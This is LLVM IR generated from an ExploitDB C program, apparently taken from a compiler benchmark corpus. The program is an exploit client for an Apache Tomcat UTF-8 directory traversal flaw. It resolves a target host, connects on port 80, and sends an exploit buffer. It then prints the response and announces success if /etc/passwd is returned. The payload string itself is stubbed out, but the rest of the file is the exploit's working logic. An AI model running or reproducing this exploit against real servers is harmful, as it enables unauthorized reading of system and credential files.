; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_14489.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_14489.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [88 x i8] c"\0AApache Tomcat < 6.0.18 UTF8 Directory Traversal Vulnerability get /etc/passwd Exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"\0Ac0d3r: mywisdom\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"\0Ausage:./tomcatevil hotname\0A\00", align 1
@RCVBUFSIZE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [46 x i8] c"\0ASorry please recheck your target hostname !\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.5 = private unnamed_addr constant [43 x i8] c"\0A[-]Checking whether port %d opens or not\0A\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"failed to connect !!!\00", align 1
@.str.7 = private unnamed_addr constant [62 x i8] c"\0A[+]Port 80 opens !!! now sending your exploit to our target\0A\00", align 1
@EXPLOIT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [5 x i8] c"send\00", align 1
@tester = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [85 x i8] c"\0A[+]w00t!!! target vulnerable! exploitation success u may see /etc/passwd above !!!\0A\00", align 1
@.str.10 = private unnamed_addr constant [31 x i8] c"\0A[-]target not vulnerable !!!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.hostent*, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = call i32 (...) @cls()
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  %22 = call i32 @exit(i32 1) #5
  unreachable

23:                                               ; preds = %2
  store i32 80, i32* %6, align 4
  %24 = load i32, i32* @RCVBUFSIZE, align 4
  %25 = zext i32 %24 to i64
  %26 = call i8* @llvm.stacksave()
  store i8* %26, i8** %7, align 8
  %27 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %8, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call %struct.hostent* @gethostbyname(i8* %30)
  store %struct.hostent* %31, %struct.hostent** %13, align 8
  %32 = icmp eq %struct.hostent* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %23
  %34 = call i32 @perror(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %35 = call i32 @exit(i32 1) #5
  unreachable

36:                                               ; preds = %23
  %37 = load i32, i32* @AF_INET, align 4
  %38 = load i32, i32* @SOCK_STREAM, align 4
  %39 = call i32 @socket(i32 %37, i32 %38, i32 0)
  store i32 %39, i32* %10, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %43 = call i32 @exit(i32 1) #5
  unreachable

44:                                               ; preds = %36
  %45 = load i32, i32* @AF_INET, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  store i32 %45, i32* %46, align 4
  %47 = load i32, i32* %6, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.5, i64 0, i64 0), i32 %47)
  %49 = load i32, i32* %6, align 4
  %50 = call i32 @htons(i32 %49)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %50, i32* %51, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %53 = load %struct.hostent*, %struct.hostent** %13, align 8
  %54 = getelementptr inbounds %struct.hostent, %struct.hostent* %53, i32 0, i32 0
  %55 = load i64, i64* %54, align 8
  %56 = inttoptr i64 %55 to %struct.in_addr*
  %57 = bitcast %struct.in_addr* %52 to i8*
  %58 = bitcast %struct.in_addr* %56 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %57, i8* align 4 %58, i64 4, i1 false)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  %60 = call i32 @memset(i32* %59, i8 signext 0, i32 8)
  %61 = load i32, i32* %10, align 4
  %62 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %63 = call i32 @connect(i32 %61, %struct.sockaddr* %62, i32 4)
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %67

65:                                               ; preds = %44
  %66 = call i32 @perror(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  br label %114

67:                                               ; preds = %44
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.7, i64 0, i64 0))
  %69 = load i32, i32* %10, align 4
  %70 = load i32, i32* @EXPLOIT, align 4
  %71 = call i32 @send(i32 %69, i32 %70, i32 999, i32 0)
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %75

73:                                               ; preds = %67
  %74 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  br label %98

75:                                               ; preds = %67
  store i32 0, i32* %12, align 4
  br label %76

76:                                               ; preds = %94, %75
  %77 = load i32, i32* %12, align 4
  %78 = load i32, i32* @RCVBUFSIZE, align 4
  %79 = icmp slt i32 %77, %78
  br i1 %79, label %80, label %97

80:                                               ; preds = %76
  %81 = load i32, i32* %10, align 4
  %82 = load i32, i32* @RCVBUFSIZE, align 4
  %83 = sub nsw i32 %82, 1
  %84 = call i32 @recv(i32 %81, i8* %27, i32 %83, i32 0)
  store i32 %84, i32* %11, align 4
  %85 = icmp sle i32 %84, 0
  br i1 %85, label %86, label %87

86:                                               ; preds = %80
  br label %94

87:                                               ; preds = %80
  %88 = load i32, i32* %11, align 4
  %89 = load i32, i32* %12, align 4
  %90 = add nsw i32 %89, %88
  store i32 %90, i32* %12, align 4
  %91 = load i32, i32* %11, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %27, i64 %92
  store i8 0, i8* %93, align 1
  br label %94

94:                                               ; preds = %87, %86
  %95 = load i32, i32* %12, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %12, align 4
  br label %76

97:                                               ; preds = %76
  br label %98

98:                                               ; preds = %97, %73
  %99 = icmp ne i8* %27, null
  br i1 %99, label %100, label %113

100:                                              ; preds = %98
  %101 = load i32, i32* @tester, align 4
  %102 = call i32 @strstr(i8* %27, i32 %101)
  store i32 %102, i32* %9, align 4
  %103 = load i32, i32* %9, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %109

105:                                              ; preds = %100
  %106 = call i32 (i8*, ...) @printf(i8* %27)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.9, i64 0, i64 0))
  %108 = call i32 @exit(i32 1) #5
  unreachable

109:                                              ; preds = %100
  %110 = call i32 (i8*, ...) @printf(i8* %27)
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0))
  %112 = call i32 @exit(i32 1) #5
  unreachable

113:                                              ; preds = %98
  br label %114

114:                                              ; preds = %113, %65
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %117

117:                                              ; preds = %114
  br label %118

118:                                              ; preds = %117
  %119 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %119)
  br label %120

120:                                              ; preds = %118
  %121 = load i32, i32* %3, align 4
  ret i32 %121
}

declare dso_local i32 @cls(...) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @strstr(i8*, i32) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind willreturn }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
